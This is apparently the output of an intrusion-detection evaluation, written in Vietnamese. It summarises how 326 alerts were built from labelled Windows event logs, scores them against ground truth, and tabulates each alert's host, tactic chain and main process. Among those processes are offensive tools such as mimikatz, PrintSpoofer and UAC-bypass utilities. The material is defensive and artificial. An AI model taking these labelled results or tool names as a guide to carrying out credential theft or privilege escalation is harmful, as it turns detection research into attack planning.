# Cảnh báo

- 36,659 event đầu vào, 3,794 event bị báo độc hại → **326 cảnh báo**
- nối event: cùng cây process / PID / phiên đăng nhập trên cùng máy, hoặc cách nhau ≤ 60s; cắt khi lặng > 1800s
- mức độ: high 123, medium 185, low 18

## So với nhãn

- cảnh báo đúng (có ít nhất 1 event độc hại thật): 311/314 (precision theo cảnh báo 0.990); cảnh báo sai theo mức độ: {'medium': 2, 'high': 1}; 12 cảnh báo chỉ gồm event uncertain, không tính
- event độc hại thật nằm trong cảnh báo: 0.943 (2945/3123)
- file có tấn công được cảnh báo: 272/274

## Danh sách

| ID | Mức | Máy | Bắt đầu | Thời lượng | Event | Chuỗi tactic | Process chính | p max |
|---|---|---|---|---|---|---|---|---|
| A0001 | high | PC01.example.corp | 2019-03-19 20:35:25 | 3952s | 104 | command-and-control → credential-access → privilege-escalation → execution → persistence | sdbinst.exe (47) | 1.00 |
| A0002 | high | IEWIN7 | 2019-05-11 16:46:10 | 5073s | 51 | privilege-escalation → defense-evasion → persistence | python.exe (13) | 1.00 |
| A0003 | high | PC01.example.corp | 2019-02-13 18:03:28 | 116s | 47 | privilege-escalation → command-and-control → discovery → lateral-movement → persistence | svchost.exe (20) | 1.00 |
| A0004 | high | PC04.example.corp | 2019-03-17 20:17:44 | 1532s | 26 | defense-evasion → privilege-escalation → credential-access → lateral-movement | explorer.exe (6) | 1.00 |
| A0005 | high | IEWIN7 | 2019-04-30 20:26:51 | 502s | 24 | lateral-movement → discovery → persistence → privilege-escalation → command-and-control → defense-evasion | cmd.exe (7) | 1.00 |
| A0006 | high | IEWIN7 | 2019-04-27 15:57:25 | 28s | 20 | execution → persistence → defense-evasion | flash_update.exe (9) | 1.00 |
| A0007 | high | IEWIN7 | 2019-05-27 15:12:38 | 21s | 17 | execution | cmd.exe (7) | 1.00 |
| A0008 | high | IEWIN7 | 2019-06-14 22:22:17 | 95s | 16 | persistence → execution → credential-access → privilege-escalation | a.exe (6) | 1.00 |
| A0009 | high | alice.insecurebank.local | 2019-06-21 07:35:37 | 74s | 15 | defense-evasion → credential-access | rundll32.exe (7) | 1.00 |
| A0010 | high | IEWIN7 | 2019-05-10 13:32:48 | 1017s | 12 | privilege-escalation → execution | python.exe (4) | 1.00 |
| A0011 | high | IEWIN7 | 2019-04-18 16:55:37 | 359s | 11 | privilege-escalation → defense-evasion → credential-access | sysmon.exe (3) | 1.00 |
| A0012 | high | MSEDGEWIN10 | 2021-12-07 17:33:01 | 0s | 11 | privilege-escalation → credential-access | malseclogon.exe (7) | 1.00 |
| A0013 | high | MSEDGEWIN10 | 2019-07-27 22:43:41 | 1s | 10 | persistence → lateral-movement → privilege-escalation → defense-evasion | uacbypass.exe (6) | 1.00 |
| A0014 | high | MSEDGEWIN10 | 2019-08-03 13:50:26 | 2s | 8 | privilege-escalation → execution | mmc.exe (2) | 1.00 |
| A0015 | high | IEWIN7 | 2019-04-29 20:59:14 | 41s | 7 | lateral-movement → discovery → privilege-escalation → persistence | system (2) | 1.00 |
| A0016 | high | MSEDGEWIN10 | 2020-10-15 13:17:02 | 0s | 7 | lateral-movement → defense-evasion | tendyron.exe (5) | 1.00 |
| A0017 | high | IEWIN7 | 2019-05-12 00:32:24 | 16s | 6 | persistence → privilege-escalation | schtasks.exe (3) | 1.00 |
| A0018 | high | IEWIN7 | 2019-05-23 17:26:08 | 1196s | 5 | execution → defense-evasion | cmd.exe (2) | 1.00 |
| A0019 | high | LAPTOP-JU4M3I0E | 2020-10-27 10:17:18 | 0s | 4 | persistence → defense-evasion → lateral-movement | processherpaderping.exe (2) | 1.00 |
| A0020 | high | MSEDGEWIN10 | 2020-09-09 13:18:23 | 4s | 3 | lateral-movement → credential-access | chrome.exe (3) | 1.00 |
| A0021 | high | MSEDGEWIN10 | 2019-08-28 14:22:27 | 6s | 110 | lateral-movement → discovery |  | 1.00 |
| A0022 | high | MSEDGEWIN10 | 2019-08-28 13:57:47 | 51s | 105 | lateral-movement → discovery |  | 1.00 |
| A0023 | high | MSEDGEWIN10 | 2019-08-27 17:17:42 | 14s | 78 | lateral-movement → discovery |  | 1.00 |
| A0024 | high | MSEDGEWIN10 | 2019-08-28 10:02:52 | 7s | 73 | lateral-movement → discovery |  | 1.00 |
| A0025 | high | MSEDGEWIN10 | 2019-08-28 13:42:28 | 6s | 73 | lateral-movement → discovery |  | 1.00 |
| A0026 | high | MSEDGEWIN10 | 2019-08-28 14:51:22 | 14s | 72 | lateral-movement → discovery |  | 1.00 |
| A0027 | high | MSEDGEWIN10 | 2019-08-28 14:52:40 | 15s | 72 | lateral-movement → discovery |  | 1.00 |
| A0028 | high | MSEDGEWIN10 | 2019-08-27 17:16:28 | 6s | 15 | lateral-movement → discovery |  | 1.00 |
| A0029 | high | IEWIN7 | 2019-05-26 04:01:42 | 5s | 11 | defense-evasion → privilege-escalation | jjs.exe (7) | 1.00 |
| A0030 | high | MSEDGEWIN10 | 2021-04-22 22:09:25 | 10s | 11 | credential-access → defense-evasion → privilege-escalation | ppldump.exe (8) | 1.00 |
| A0031 | high | IEWIN7 | 2019-06-20 08:07:42 | 16s | 9 | lateral-movement → privilege-escalation → execution | cmd.exe (2) | 1.00 |
| A0032 | high | PC04.example.corp | 2019-04-03 18:11:54 | 0s | 3 | persistence | wmighost.exe (1) | 1.00 |
| A0033 | high | IEWIN7 | 2019-05-23 16:48:35 | 33s | 3 | privilege-escalation → execution | spoolsv.exe (1) | 1.00 |
| A0034 | high | IEWIN7 | 2019-05-14 01:29:00 | 4s | 2 | defense-evasion → execution | mshta.exe (2) | 1.00 |
| A0035 | high | PC01.example.corp | 2019-02-16 10:01:50 | 135s | 16 | privilege-escalation → defense-evasion → command-and-control → discovery → persistence | plink.exe (5) | 1.00 |
| A0036 | high | LAPTOP-JU4M3I0E | 2021-08-22 19:33:37 | 2s | 7 | privilege-escalation → discovery → persistence | efspotato.exe (3) | 1.00 |
| A0037 | high | LAPTOP-JU4M3I0E | 2021-01-26 13:21:13 | 19s | 6 | execution → persistence | msbuild.exe (2) | 1.00 |
| A0038 | high | IEWIN7 | 2019-05-13 18:02:47 | 33s | 5 | persistence → execution | regsvr32.exe (2) | 1.00 |
| A0039 | high | MSEDGEWIN10 | 2019-08-30 12:54:07 | 1s | 4 | privilege-escalation → credential-access → persistence → defense-evasion | rundll32.exe (3) | 1.00 |
| A0040 | high | MSEDGEWIN10 | 2020-04-25 22:18:47 | 94s | 6 | privilege-escalation → execution → lateral-movement | consent.exe (2) | 1.00 |
| A0041 | high | MSEDGEWIN10 | 2020-02-10 10:08:24 | 3s | 3 | defense-evasion | ppldump.exe (3) | 1.00 |
| A0042 | high | DESKTOP-PIU87N6 | 2020-09-28 12:47:36 | 0s | 3 | defense-evasion → credential-access | rdrleakdiag.exe (3) | 1.00 |
| A0043 | high | DC1.insecurebank.local | 2019-05-08 03:00:11 | 26s | 10 | defense-evasion → persistence |  | 1.00 |
| A0044 | high | MSEDGEWIN10 | 2020-12-09 16:52:34 | 49s | 9 | privilege-escalation → lateral-movement | psexecprivesc.exe (3) | 1.00 |
| A0045 | high | IEWIN7 | 2019-04-27 18:47:00 | 485s | 7 | privilege-escalation → defense-evasion → execution | keefarce.exe (4) | 1.00 |
| A0046 | high | PC01.example.corp | 2019-03-18 11:06:25 | 1258s | 9 | defense-evasion → privilege-escalation → persistence | wmic.exe (3) | 1.00 |
| A0047 | high | IEWIN7 | 2019-05-02 14:48:51 | 45s | 2 | execution → credential-access | powershell.exe (2) | 1.00 |
| A0048 | high | MSEDGEWIN10 | 2020-03-21 05:00:16 | 29s | 59 | defense-evasion → persistence → privilege-escalation | rundll32.exe (37) | 1.00 |
| A0049 | high | MSEDGEWIN10 | 2020-08-12 13:04:27 | 101s | 33 | privilege-escalation → persistence → execution | spoolsv.exe (22) | 1.00 |
| A0050 | high | MSEDGEWIN10 | 2021-04-20 20:32:55 | 77s | 8 | lateral-movement → privilege-escalation → discovery → execution | powershell.exe (2) | 1.00 |
| A0051 | high | IEWIN7 | 2019-04-30 07:23:00 | 1394s | 54 | discovery → defense-evasion → privilege-escalation | m.exe (50) | 1.00 |
| A0052 | high | PC01.example.corp | 2019-03-19 23:13:03 | 1324s | 20 | command-and-control → credential-access → privilege-escalation → execution → persistence → defense-evasion | cmd.exe (3) | 1.00 |
| A0053 | high | IEWIN7 | 2019-04-30 12:43:43 | 0s | 9 | credential-access | voice_mail.msg.exe (9) | 1.00 |
| A0054 | high | MSEDGEWIN10 | 2020-03-21 21:45:04 | 0s | 3 | defense-evasion → privilege-escalation → execution | powershell.exe (2) | 1.00 |
| A0055 | high | MSEDGEWIN10 | 2020-03-21 12:35:35 | 33s | 8 | defense-evasion → privilege-escalation | nc.exe (3) | 1.00 |
| A0056 | high | MSEDGEWIN10 | 2020-09-27 13:19:54 | 1341s | 30 | discovery → defense-evasion | system (19) | 1.00 |
| A0057 | high | MSEDGEWIN10 | 2020-08-02 16:24:07 | 78s | 10 | defense-evasion → privilege-escalation → persistence → execution | fxssvc.exe (4) | 1.00 |
| A0058 | high | WIN-77LTAPHIQ1R.example.corp | 2019-03-19 00:02:00 | 17s | 32 | defense-evasion → privilege-escalation → discovery → lateral-movement → execution | - (4) | 1.00 |
| A0059 | high | MSEDGEWIN10 | 2021-06-09 04:58:49 | 0s | 1 | credential-access |  | 1.00 |
| A0060 | high | MSEDGEWIN10 | 2021-06-09 05:18:11 | 0s | 1 | credential-access |  | 1.00 |
| A0061 | high | LAPTOP-JU4M3I0E | 2020-10-05 22:28:20 | 0s | 3 | privilege-escalation → persistence | mmc.exe (2) | 1.00 |
| A0062 | high | MSEDGEWIN10 | 2020-07-10 10:20:33 | 25s | 9 | lateral-movement → defense-evasion | explorer.exe (5) | 1.00 |
| A0063 | high | MSEDGEWIN10 | 2020-01-14 20:48:13 | 32s | 7 | lateral-movement → execution | wmiprvse.exe (2) | 1.00 |
| A0064 | high | LAPTOP-JU4M3I0E | 2020-07-02 18:00:29 | 0s | 2 | defense-evasion → privilege-escalation | chost.exe (1) | 1.00 |
| A0065 | high | IEWIN7 | 2019-05-18 17:16:08 | 10s | 84 | execution → defense-evasion | powershell.exe (83) | 1.00 |
| A0066 | high | DC1.insecurebank.local | 2019-05-16 01:31:36 | 0s | 3 | lateral-movement → defense-evasion | winrshost.exe (1) | 1.00 |
| A0067 | high | IEWIN7 | 2019-04-30 10:12:45 | 56s | 2 | persistence → execution | cmd.exe (1) | 1.00 |
| A0068 | high | PC04.example.corp | 2019-03-17 19:09:41 | 21s | 4 | credential-access | procdump.exe (2) | 1.00 |
| A0069 | high | IEWIN7 | 2019-05-24 01:33:53 | 0s | 3 | privilege-escalation → discovery | cmd.exe (1) | 1.00 |
| A0070 | high | MSEDGEWIN10 | 2019-11-04 09:27:25 | 1s | 25 | lateral-movement → defense-evasion |  | 1.00 |
| A0071 | high | WIN-77LTAPHIQ1R.example.corp | 2019-03-18 23:23:37 | 44s | 30 | defense-evasion → discovery → lateral-movement | lsass.exe (18) | 1.00 |
| A0072 | high | MSEDGEWIN10 | 2020-03-08 22:11:34 | 0s | 2 | credential-access | cscript.exe (2) | 1.00 |
| A0073 | high | MSEDGEWIN10 | 2019-08-28 14:13:36 | 0s | 50 | lateral-movement → discovery |  | 1.00 |
| A0074 | high | MSEDGEWIN10 | 2019-08-27 17:26:41 | 0s | 37 | lateral-movement → discovery |  | 1.00 |
| A0075 | high | MSEDGEWIN10 | 2019-08-28 10:07:43 | 0s | 30 | lateral-movement → discovery |  | 1.00 |
| A0076 | high | LAPTOP-JU4M3I0E | 2020-09-04 10:54:20 | 3s | 4 | persistence | lsass.exe (4) | 1.00 |
| A0077 | high | LAPTOP-JU4M3I0E | 2020-09-04 09:28:22 | 21s | 3 | persistence | lsass.exe (3) | 1.00 |
| A0078 | high | LAPTOP-JU4M3I0E | 2020-09-04 11:00:13 | 11s | 3 | persistence | lsass.exe (3) | 1.00 |
| A0079 | high | MSEDGEWIN10 | 2020-02-10 08:28:12 | 0s | 7 | defense-evasion → discovery | furutaka.exe (3) | 1.00 |
| A0080 | high | MSEDGEWIN10 | 2020-07-09 22:00:09 | 57s | 33 | lateral-movement → execution | explorer.exe (19) | 1.00 |
| A0081 | high | WIN-77LTAPHIQ1R.example.corp | 2019-03-18 22:15:49 | 0s | 6 | discovery → defense-evasion → lateral-movement → privilege-escalation | - (4) | 0.99 |
| A0082 | high | 2012r2srv.maincorp.local | 2017-06-12 23:39:43 | 0s | 3 | discovery → privilege-escalation | lsass.exe (2) | 0.99 |
| A0083 | high | 01566s-win16-ir.threebeesco.com | 2021-12-12 17:57:17 | 36s | 16 | defense-evasion → privilege-escalation | - (3) | 0.99 |
| A0084 | high | IEWIN7 | 2019-01-19 12:57:09 | 33s | 10 | discovery → lateral-movement |  | 0.99 |
| A0085 | high | win10.ecorp.com | 2020-07-03 09:05:58 | 0s | 6 | persistence → execution → defense-evasion | explorer.exe (2) | 0.99 |
| A0086 | high | MSEDGEWIN10 | 2020-07-09 22:05:55 | 24s | 6 | privilege-escalation → lateral-movement | explorer.exe (5) | 0.99 |
| A0087 | high | 01566s-win16-ir.threebeesco.com | 2020-07-22 20:29:27 | 9s | 12 | defense-evasion → credential-access → lateral-movement → privilege-escalation |  | 0.99 |
| A0088 | high | IEWIN7 | 2019-05-26 15:47:56 | 4s | 9 | privilege-escalation → execution | notepad.exe (9) | 0.99 |
| A0089 | high | IEWIN7 | 2019-04-27 19:27:55 | 355s | 5 | defense-evasion → credential-access | wsus.exe (4) | 0.99 |
| A0090 | high | LAPTOP-JU4M3I0E | 2020-07-07 21:51:39 | 0s | 3 | credential-access | procdump64.exe (2) | 0.99 |
| A0091 | high | PC02.example.corp | 2019-02-13 15:15:08 | 28s | 2 | command-and-control → privilege-escalation | services.exe (1) | 0.99 |
| A0092 | high | DC1.insecurebank.local | 2019-03-25 11:14:33 | 302s | 14 | credential-access → privilege-escalation |  | 0.99 |
| A0093 | high | IEWIN7 | 2019-01-19 13:00:10 | 0s | 8 | lateral-movement → discovery |  | 0.99 |
| A0094 | high | MSEDGEWIN10 | 2020-12-09 22:45:33 | 0s | 2 | lateral-movement → persistence | <unknown process> (1) | 0.99 |
| A0095 | high | WIN-77LTAPHIQ1R.example.corp | 2019-03-19 00:41:28 | 0s | 2 | discovery → lateral-movement |  | 0.99 |
| A0096 | high | 01566s-win16-ir.threebeesco.com | 2020-09-17 10:57:37 | 7s | 6 | defense-evasion → discovery → privilege-escalation | - (1) | 0.99 |
| A0097 | high | MSEDGEWIN10 | 2020-09-15 18:04:36 | 4s | 3 | defense-evasion → privilege-escalation | w3wp.exe (2) | 0.99 |
| A0098 | high | 01566s-win16-ir.threebeesco.com | 2022-02-16 10:37:07 | 14s | 15 | defense-evasion → privilege-escalation → lateral-movement → discovery | - (2) | 0.99 |
| A0099 | high | DC1.insecurebank.local | 2019-11-26 23:55:00 | 2s | 4 | credential-access |  | 0.99 |
| A0100 | high | MSEDGEWIN10 | 2019-09-08 19:14:54 | 0s | 1 | persistence | msbuild.exe (1) | 0.98 |
| A0101 | high | PC01.example.corp | 2019-02-16 17:54:26 | 14s | 4 | lateral-movement → discovery |  | 0.98 |
| A0102 | high | PC01.example.corp | 2019-02-16 17:55:47 | 14s | 4 | lateral-movement → discovery |  | 0.98 |
| A0103 | high | PC01.example.corp | 2019-02-16 17:57:41 | 14s | 4 | lateral-movement → discovery |  | 0.98 |
| A0104 | high | PC04.example.corp | 2019-03-17 19:37:11 | 0s | 1 | credential-access | mimikatz.exe (1) | 0.98 |
| A0105 | high | PC01.example.corp | 2019-02-13 18:01:41 | 24s | 5 | defense-evasion → privilege-escalation → command-and-control | tstheme.exe (1) | 0.98 |
| A0106 | high | IEWIN7 | 2019-05-19 18:05:07 | 26s | 2 | persistence → defense-evasion | reg.exe (2) | 0.98 |
| A0107 | high | MSEDGEWIN10 | 2020-10-17 22:52:29 | 37s | 20 | lateral-movement → persistence → privilege-escalation | system (10) | 0.97 |
| A0108 | high | 01566s-win16-ir.threebeesco.com | 2020-09-23 16:49:41 | 64s | 15 | defense-evasion → discovery → lateral-movement | system (3) | 0.97 |
| A0109 | high | DC1.insecurebank.local | 2019-03-25 21:28:11 | 34s | 28 | defense-evasion → persistence |  | 0.97 |
| A0110 | high | PC01.example.corp | 2019-03-19 17:22:24 | 1124s | 8 | persistence → execution → privilege-escalation | ui0detect.exe (4) | 0.97 |
| A0111 | high | WIN-77LTAPHIQ1R.example.corp | 2019-01-20 07:00:50 | 1760s | 7 | defense-evasion → discovery |  | 0.97 |
| A0112 | high | alice.insecurebank.local | 2019-11-15 08:19:02 | 14s | 2 | defense-evasion → privilege-escalation | - (1) | 0.96 |
| A0113 | high | MSEDGEWIN10 | 2020-09-20 21:22:24 | 0s | 1 | persistence | lsass.exe (1) | 0.96 |
| A0114 | high | LAPTOP-JU4M3I0E | 2020-09-04 10:03:04 | 0s | 2 | persistence | lsass.exe (2) | 0.95 |
| A0115 | high | MSEDGEWIN10 | 2020-12-10 11:18:54 | 0s | 2 | persistence → lateral-movement | wmiprvse.exe (2) | 0.95 |
| A0116 | high | IEWIN7 | 2019-05-15 04:18:40 | 0s | 1 | lateral-movement | wmiprvse.exe (1) | 0.94 |
| A0117 | high | MSEDGEWIN10 | 2020-06-30 14:23:58 | 10s | 4 | persistence → credential-access |  | 0.93 |
| A0118 | high | MSEDGEWIN10 | 2021-03-15 18:48:38 | 104s | 8 | command-and-control → persistence |  | 0.93 |
| A0119 | high | 02694w-win10.threebeesco.com | 2020-10-06 22:11:17 | 0s | 5 | lateral-movement → discovery → privilege-escalation | system (3) | 0.92 |
| A0120 | high | LAPTOP-JU4M3I0E | 2020-09-04 10:45:30 | 3s | 2 | persistence | lsass.exe (2) | 0.92 |
| A0121 | high | LAPTOP-JU4M3I0E | 2020-09-04 11:02:16 | 0s | 1 | persistence | lsass.exe (1) | 0.92 |
| A0122 | high | MSEDGEWIN10 | 2020-10-13 23:06:02 | 0s | 3 | lateral-movement | svchost.exe (3) | 0.92 |
| A0123 | high | MSEDGEWIN10 | 2019-09-09 13:35:08 | 1s | 2 | credential-access → defense-evasion |  | 0.91 |
| A0124 | medium | PC01.example.corp | 2019-03-18 14:23:22 | 48s | 869 | lateral-movement |  | 1.00 |
| A0125 | medium | MSEDGEWIN10 | 2020-10-23 21:57:29 | 53s | 49 | persistence | rundll32.exe (44) | 1.00 |
| A0126 | medium | IEWIN7 | 2019-05-27 01:28:42 | 38s | 40 | credential-access | appcmd.exe (39) | 1.00 |
| A0127 | medium | IEWIN7 | 2019-05-12 13:30:32 | 2857s | 18 | execution | rundll32.exe (8) | 1.00 |
| A0128 | medium | MSEDGEWIN10 | 2020-10-17 11:43:27 | 22s | 18 | defense-evasion | test.exe (8) | 1.00 |
| A0129 | medium | IEWIN7 | 2019-05-21 00:35:07 | 5s | 17 | persistence | firefox.exe (7) | 1.00 |
| A0130 | medium | DESKTOP-NTSSLJD | 2020-10-20 11:50:54 | 15s | 16 | privilege-escalation | ieinstal.exe (5) | 1.00 |
| A0131 | medium | IEWIN7 | 2019-05-09 01:59:28 | 512s | 10 | privilege-escalation | powershell.exe (6) | 1.00 |
| A0132 | medium | IEWIN7 | 2019-06-19 17:22:37 | 34s | 10 | persistence | reg.exe (6) | 1.00 |
| A0133 | medium | MSEDGEWIN10 | 2021-08-07 23:32:57 | 18s | 10 | execution | svchost.exe (4) | 1.00 |
| A0134 | medium | IEWIN7 | 2019-05-11 09:50:08 | 19s | 9 | privilege-escalation | mcx2prov.exe (3) | 1.00 |
| A0135 | medium | IEWIN7 | 2019-05-12 17:01:31 | 1158s | 8 | execution | cmd.exe (3) | 1.00 |
| A0136 | medium | IEWIN7 | 2019-06-15 07:13:42 | 504s | 7 | execution | mshta.exe (2) | 1.00 |
| A0137 | medium | LAPTOP-JU4M3I0E | 2021-10-21 16:27:02 | 11s | 7 | execution | cscript.exe (4) | 1.00 |
| A0138 | medium | MSEDGEWIN10 | 2019-07-29 21:11:11 | 8s | 6 | execution | rundll32.exe (2) | 1.00 |
| A0139 | medium | 02694w-win10.threebeesco.com | 2020-11-26 10:44:49 | 35s | 6 | privilege-escalation | spoolsv.exe (5) | 1.00 |
| A0140 | medium | IEWIN7 | 2019-05-10 12:21:57 | 17s | 5 | privilege-escalation | python.exe (4) | 1.00 |
| A0141 | medium | IEWIN7 | 2019-05-21 15:32:57 | 3s | 5 | execution | cmd.exe (1) | 1.00 |
| A0142 | medium | MSEDGEWIN10 | 2020-05-11 23:21:56 | 0s | 5 | privilege-escalation | roguepotato.exe (2) | 1.00 |
| A0143 | medium | DESKTOP-TTEQ6PR | 2022-02-19 17:35:16 | 0s | 4 | privilege-escalation | spoolfool.exe (2) | 1.00 |
| A0144 | medium | IEWIN7 | 2019-05-09 03:25:24 | 0s | 3 | privilege-escalation | powershell.exe (1) | 1.00 |
| A0145 | medium | IEWIN7 | 2019-05-22 04:02:11 | 0s | 2 | execution | cmd.exe (1) | 1.00 |
| A0146 | medium | MSEDGEWIN10 | 2019-07-26 07:39:14 | 1s | 2 | execution | hh.exe (1) | 1.00 |
| A0147 | medium | LAPTOP-JU4M3I0E | 2020-10-05 20:43:58 | 0s | 2 | privilege-escalation | akagi_64.exe (1) | 1.00 |
| A0148 | medium | MSEDGEWIN10 | 2019-08-03 12:06:53 | 1556s | 47 | privilege-escalation | consent.exe (18) | 1.00 |
| A0149 | medium | MSEDGEWIN10 | 2019-08-04 10:16:29 | 26s | 15 | privilege-escalation | reg.exe (8) | 1.00 |
| A0150 | medium | MSEDGEWIN10 | 2020-05-02 18:01:52 | 5s | 7 | privilege-escalation | printspoofer.exe (4) | 1.00 |
| A0151 | medium | LAPTOP-JU4M3I0E | 2020-11-26 17:38:11 | 1s | 7 | privilege-escalation | byeintegrity5-uac.exe (5) | 1.00 |
| A0152 | medium | IEWIN7 | 2019-05-12 18:35:04 | 828s | 5 | execution | regsvr32.exe (2) | 1.00 |
| A0153 | medium | MSEDGEWIN10 | 2019-08-14 11:53:29 | 1425s | 5 | execution | explorer.exe (2) | 1.00 |
| A0154 | medium | DC1.insecurebank.local | 2019-05-19 17:32:00 | 0s | 1 | defense-evasion | attrib.exe (1) | 1.00 |
| A0155 | medium | MSEDGEWIN10 | 2019-08-04 08:56:16 | 2265s | 32 | privilege-escalation | uacme.exe (6) | 1.00 |
| A0156 | medium | IEWIN7 | 2019-05-09 02:52:18 | 5s | 15 | privilege-escalation | wusa.exe (8) | 1.00 |
| A0157 | medium | MSEDGEWIN10 | 2019-08-03 09:46:48 | 1640s | 15 | privilege-escalation | explorer.exe (5) | 1.00 |
| A0158 | medium | MSEDGEWIN10 | 2019-08-03 11:23:15 | 2s | 11 | privilege-escalation | werfault.exe (3) | 1.00 |
| A0159 | medium | MSEDGEWIN10 | 2019-08-03 15:08:06 | 506s | 11 | privilege-escalation | uacme.exe (3) | 1.00 |
| A0160 | medium | MSEDGEWIN10 | 2019-08-03 10:51:46 | 2s | 8 | privilege-escalation | consent.exe (3) | 1.00 |
| A0161 | medium | DESKTOP-RIPCLIP | 2020-08-26 05:09:28 | 5s | 6 | execution | dyxxur4gx.exe (1) | 1.00 |
| A0162 | medium | MSEDGEWIN10 | 2019-08-04 07:26:33 | 2s | 5 | privilege-escalation | uacme.exe (2) | 1.00 |
| A0163 | medium | alice.insecurebank.local | 2019-05-14 17:17:24 | 0s | 2 | defense-evasion | powershell.exe (2) | 1.00 |
| A0164 | medium | MSEDGEWIN10 | 2020-12-15 15:00:14 | 0s | 2 | discovery | powershell.exe (2) | 1.00 |
| A0165 | medium | IEWIN7 | 2019-04-30 22:48:58 | 209s | 6 | execution | msiexec.exe (3) | 1.00 |
| A0166 | medium | MSEDGEWIN10 | 2020-05-10 00:09:36 | 7s | 9 | privilege-escalation | networkserviceexploit.exe (6) | 1.00 |
| A0167 | medium | MSEDGEWIN10 | 2020-10-01 18:35:02 | 0s | 2 | privilege-escalation | poc.exe (2) | 1.00 |
| A0168 | medium | MSEDGEWIN10 | 2020-07-26 22:13:19 | 775s | 4 | privilege-escalation | powershell.exe (2) | 1.00 |
| A0169 | medium | IEWIN7 | 2019-05-14 02:32:48 | 3s | 12 | privilege-escalation | sysprep.exe (5) | 1.00 |
| A0170 | medium | MSEDGEWIN10 | 2020-01-14 20:46:39 | 4s | 4 | lateral-movement | wmiprvse.exe (1) | 1.00 |
| A0171 | medium | MSEDGEWIN10 | 2020-07-03 08:47:20 | 0s | 2 | execution | cmd.exe (1) | 1.00 |
| A0172 | medium | MSEDGEWIN10 | 2020-05-24 01:13:47 | 6s | 5 | privilege-escalation | roguewinrm.exe (3) | 1.00 |
| A0173 | medium | MSEDGEWIN10 | 2020-07-08 21:41:52 | 81s | 3 | defense-evasion | mmc.exe (2) | 1.00 |
| A0174 | medium | MSEDGEWIN10 | 2020-07-04 14:18:58 | 0s | 1 | persistence | a.exe (1) | 1.00 |
| A0175 | medium | MSEDGEWIN10 | 2020-01-14 20:44:46 | 5s | 4 | lateral-movement | wmiprvse.exe (1) | 1.00 |
| A0176 | medium | MSEDGEWIN10 | 2019-11-03 13:51:56 | 0s | 1 | persistence | cmd.exe (1) | 1.00 |
| A0177 | medium | MSEDGEWIN10 | 2020-05-12 15:06:49 | 0s | 6 | privilege-escalation | explorer.exe (2) | 1.00 |
| A0178 | medium | MSEDGEWIN10 | 2020-05-07 13:13:01 | 1s | 2 | privilege-escalation | reg.exe (1) | 1.00 |
| A0179 | medium | MSEDGEWIN10 | 2020-07-02 17:51:37 | 0s | 1 | defense-evasion | spooler.exe (1) | 1.00 |
| A0180 | medium | MSEDGEWIN10 | 2020-07-09 22:02:42 | 0s | 1 | defense-evasion | mmc.exe (1) | 1.00 |
| A0181 | medium | MSEDGEWIN10 | 2020-07-09 22:07:33 | 0s | 1 | defense-evasion | mmc.exe (1) | 1.00 |
| A0182 | medium | MSEDGEWIN10 | 2020-11-13 11:40:43 | 96s | 17 | lateral-movement |  | 1.00 |
| A0183 | medium | MSEDGEWIN10 | 2020-11-13 11:47:42 | 97s | 10 | lateral-movement |  | 1.00 |
| A0184 | medium | MSEDGEWIN10 | 2020-11-13 11:09:07 | 59s | 8 | lateral-movement |  | 1.00 |
| A0185 | medium | IEWIN7 | 2019-05-18 17:50:36 | 37s | 2 | execution | winpm.exe (1) | 1.00 |
| A0186 | medium | IEWIN7 | 2019-07-03 20:10:06 | 1764s | 13 | execution | powershell.exe (9) | 1.00 |
| A0187 | medium | MSEDGEWIN10 | 2020-11-13 11:20:28 | 13s | 5 | lateral-movement |  | 1.00 |
| A0188 | medium | MSEDGEWIN10 | 2020-08-25 10:08:05 | 32s | 20 | privilege-escalation | transactionlog.exe (14) | 1.00 |
| A0189 | medium | MSEDGEWIN10 | 2019-11-04 13:46:01 | 0s | 10 | credential-access |  | 1.00 |
| A0190 | medium | LAPTOP-JU4M3I0E | 2020-10-13 20:11:42 | 0s | 3 | execution | cmd.exe (2) | 1.00 |
| A0191 | medium | alice.insecurebank.local | 2019-05-14 14:04:05 | 0s | 1 | persistence | mstsc.exe (1) | 1.00 |
| A0192 | medium | DC1.insecurebank.local | 2019-05-16 13:10:13 | 0s | 1 | defense-evasion | powershell.exe (1) | 1.00 |
| A0193 | medium | MSEDGEWIN10 | 2019-09-08 19:17:44 | 0s | 2 | persistence | psexec64.exe (1) | 1.00 |
| A0194 | medium | DC1.insecurebank.local | 2019-05-16 01:38:19 | 0s | 1 | lateral-movement | hostname.exe (1) | 0.99 |
| A0195 | medium | PC01.example.corp | 2019-02-16 18:19:18 | 0s | 18 | lateral-movement |  | 0.99 |
| A0196 | medium | 04246w-win10.threebeesco.com | 2020-08-27 11:40:56 | 0s | 2 | privilege-escalation | system (1) | 0.99 |
| A0197 | medium | IEWIN7 | 2019-05-28 23:09:38 | 0s | 1 | persistence | reg.exe (1) | 0.99 |
| A0198 | medium | IEWIN7 | 2019-05-20 15:54:31 | 1s | 6 | lateral-movement |  | 0.99 |
| A0199 | medium | MSEDGEWIN10 | 2019-08-14 12:48:15 | 0s | 1 | privilege-escalation | mimikatz.exe (1) | 0.99 |
| A0200 | medium | MSEDGEWIN10 | 2019-08-28 03:36:49 | 0s | 5 | lateral-movement |  | 0.99 |
| A0201 | medium | MSEDGEWIN10 | 2019-08-28 18:59:59 | 0s | 5 | lateral-movement |  | 0.99 |
| A0202 | medium | DC1.insecurebank.local | 2019-03-25 10:33:53 | 103s | 12 | credential-access |  | 0.99 |
| A0203 | medium | DC1.insecurebank.local | 2019-03-25 12:31:35 | 130s | 9 | credential-access |  | 0.99 |
| A0204 | medium | IEWIN7 | 2019-05-21 01:10:05 | 47s | 3 | persistence | reg.exe (3) | 0.99 |
| A0205 | medium | DC1.insecurebank.local | 2019-05-08 02:10:43 | 0s | 3 | persistence |  | 0.99 |
| A0206 | medium | MSEDGEWIN10 | 2019-09-06 13:49:35 | 4s | 2 | lateral-movement | kekeo.exe (2) | 0.99 |
| A0207 | medium | IEWIN7 | 2019-04-28 16:29:42 | 0s | 1 | defense-evasion | mimikatz.exe (1) | 0.99 |
| A0208 | medium | DC1.insecurebank.local | 2019-05-16 16:08:40 | 0s | 1 | persistence | whoami.exe (1) | 0.99 |
| A0209 | medium | PC02.example.corp | 2019-02-13 15:31:19 | 12s | 2 | privilege-escalation | - (2) | 0.98 |
| A0210 | medium | MSEDGEWIN10 | 2019-09-01 11:54:22 | 0s | 1 | discovery |  | 0.98 |
| A0211 | medium | MSEDGEWIN10 | 2019-07-18 21:50:20 | 0s | 1 | execution |  | 0.98 |
| A0212 | medium | MSEDGEWIN10 | 2019-07-29 21:14:29 | 0s | 1 | execution |  | 0.98 |
